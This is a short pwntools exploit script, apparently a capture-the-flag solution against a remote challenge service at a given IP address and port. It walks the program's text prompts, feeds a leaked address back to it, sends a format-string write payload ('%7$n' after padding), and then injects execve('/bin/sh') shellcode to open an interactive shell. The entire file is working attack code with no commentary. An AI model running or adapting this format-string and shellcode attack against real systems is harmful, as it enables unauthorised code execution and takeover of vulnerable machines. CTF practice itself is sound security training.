from pwn import *
#context.log_level = 'debug'

r = remote("111.198.29.45", 47892)
#r = process("./string")

r.recvuntil("secret[0] is ")
addr = int(r.recvuntil("\n")[:-1], 16)
print addr

r.recvuntil("What should your character's name be:\n")
r.sendline("aaa")

r.recvuntil("So, where you will go?east or up?:\n")
r.sendline("east")

r.recvuntil("go into there(1), or leave(0)?:\n")
r.sendline("1")

r.recvuntil("'Give me an address'\n")
r.sendline(str(addr))

r.recvuntil("And, you wish is:\n")
payload = 'A' * 85 + "%7$n"
r.sendline(payload)

#shellcode = asm(shellcraft.sh())
shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
r.sendline(shellcode)

r.interactive()



